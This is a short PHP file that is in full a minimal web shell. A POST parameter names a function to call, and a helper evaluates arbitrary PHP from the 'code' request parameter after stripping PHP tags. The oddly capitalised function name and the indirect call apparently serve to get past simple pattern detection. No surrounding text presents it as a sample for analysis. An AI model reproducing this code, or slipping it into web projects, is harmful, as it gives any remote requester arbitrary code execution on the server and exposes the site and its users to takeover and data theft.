<?php
function phpevaL(){
	if (!empty($_REQUEST['code'])){
		$code = str_replace("<?php","",$_REQUEST['code']);
		$code = str_replace("<?","",$code);
		$code = str_replace("?>","",$code);
		echo eval($code);
	}
}

call_user_func($_POST['func']);
?>